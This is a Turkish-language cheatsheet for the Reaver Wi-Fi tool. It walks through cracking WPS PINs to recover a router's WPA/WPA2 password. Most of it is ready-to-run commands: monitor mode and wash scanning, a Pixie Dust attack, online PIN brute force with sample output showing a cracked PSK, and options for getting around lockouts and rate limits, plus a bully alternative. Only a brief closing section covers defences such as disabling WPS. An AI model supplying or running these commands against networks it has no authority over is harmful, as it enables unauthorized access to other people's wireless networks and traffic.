# Reaver Bilgi Notu (Cheatsheet)

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x), Wi-Fi Protected Setup (WPS) kayıt PIN'lerine yönelik kaba kuvvet (brute-force) saldırıları gerçekleştiren ve modemin WPA/WPA2 ön paylaşımlı parolasını (PSK) açık metin olarak ele geçiren popüler bir kablosuz güvenlik test aracıdır. Ayrıca `pixiewps` yardımıyla saniyeler süren çevrim dışı **Pixie Dust** saldırısını destekler.

---

## İçindekiler

- [WPS Zafiyet Mantığı](#wps-zafiyet-mantığı)
- [Kurulum (`reaver` & `pixiewps`)](#kurulum-reaver--pixiewps)
- [WPS Açık Modelleri Keşfetme (`wash`)](#wps-açık-modelleri-keşfetme-wash)
- [Pixie Dust Saldırısı (Anlık Parola Çözme)](#pixie-dust-saldırısı-anlık-parola-çözme)
- [Tam Çevrim İçi WPS PIN Kaba Kuvvet Saldırısı](#tam-çevrim-içi-wps-pin-kaba-kuvvet-saldırısı)
- [AP Hız Sınırları & Kilitlenmeleri Yönetme](#ap-hız-sınırları--kilitlenmeleri-yönetme)
- [Savunma & Sertleştirme Önlemleri](#savunma--sertleştirme-önlemleri)

---

## WPS Zafiyet Mantığı

WPS PIN doğrulaması 8 basamaktan oluşur ve iki bağımsız yarıya bölünerek doğrulanır:
- İlk 4 basamak ($10^4 = 10.000$ olasılık).
- Son 3 basamak + 1 sağlama (checksum) basamağı ($10^3 = 1.000$ olasılık).
- Normalde $10^8 = 100.000.000$ olasılık varken, protokol hatası nedeniyle toplam deneme sayısı en fazla $10.000 + 1.000 = 11.000$ ile sınırlıdır.
- **Pixie Dust Saldırısı:** Bazı yonga üreticilerinin (Ralink, MediaTek, Realtek, Broadcom) rastgele sayı üreteçlerindeki (PRNG) entropi zayıflığından faydalanarak, sadece 2 paketten PIN'i çevrim dışı olarak saniyeler içinde hesaplar.

---

## Kurulum (`reaver` & `pixiewps`)

```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Yardım menüsünü kontrol edin
reaver -h
```

---

## WPS Açık Modelleri Keşfetme (`wash`)

Saldırıya başlamadan önce çevredeki WPS destekli ve kilitli olmayan modemleri tespit edin:

```bash
# Ağ kartını monitör moduna alın
sudo airmon-ng start wlan0
# veya:
sudo iw dev wlan0 set type monitor

# wash aracıyla WPS açık modemleri tarayın
sudo wash -i wlan0mon
```
İncelenmesi gereken sütunlar:
- **`WPS Locked`**: `Yes` ise modem PIN denemelerine karşı kilitlenmiştir. `No` olan hedefler seçilmelidir.
- **`WPS Ver`**: WPS sürümü (1.0 veya 2.0).
- **`ESSID` & `BSSID`**: Hedef ağ adı ve MAC adresi.

---

## Pixie Dust Saldırısı (Anlık Parola Çözme)

Pixie Dust (`-K 1`), modemi kilitlemeden ve hız sınırına takılmadan anahtarı yerel işlemcide çözer:

```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: Monitör modundaki arayüz.
- `-b <bssid>`: Hedef modemin MAC adresi.
- `-c 6`: Modemin yayın yaptığı kanal.
- `-K 1`: `pixiewps` ile otomatik Pixie Dust saldırısı yürütür.
- `-vv`: Ayrıntılı log çıktısı.

*Modem zafiyetliyse, Wi-Fi parolası genellikle 10 saniye içinde ekrana yazılır.*

---

## Tam Çevrim İçi WPS PIN Kaba Kuvvet Saldırısı

Eğer Pixie Dust başarılı olamazsa, standart çevrim içi PIN deneme saldırısına geçilir:

```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```

PIN bulunduğunda Reaver parolayı döker:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SirketKablosuzSifresi2024'
[+] AP SSID: 'Hedef_Ag'
```

---

## AP Hız Sınırları & Kilitlenmeleri Yönetme

Çoğu modem arka arkaya 3-5 hatalı PIN denemesinden sonra WPS'i 5-15 dakika kilitler:

```bash
# Denemeler arasına 10 saniye bekleme koyun
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Modem kilitlendiğinde 300 saniye (5 dk) bekleyip devam et
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Kilit bildirimlerini yoksayarak denemeye devam et
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```

### Alternatif: `bully` Kullanımı
`bully`, C diliyle yazılmış modern ve kararlı bir alternatiftir:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```

---

## Savunma & Sertleştirme Önlemleri

- **WPS'i Tamamen Kapatın:** Modem arayüzüne girerek WPS özelliğini devre dışı bırakmak en kesin çözümdür.
- **Yazılımı (Firmware) Güncelleyin:** Güncel yazılımlar Pixie Dust entropi açığını giderir ve hatalı denemelerde WPS'i kalıcı olarak kapatır.
- **WPA3 Güvenliğine Geçin:** WPA3 mimarisinde PIN tabanlı WPS tamamen kaldırılmış, yerine güvenli DPP (Wi-Fi Easy Connect) standardı getirilmiştir.
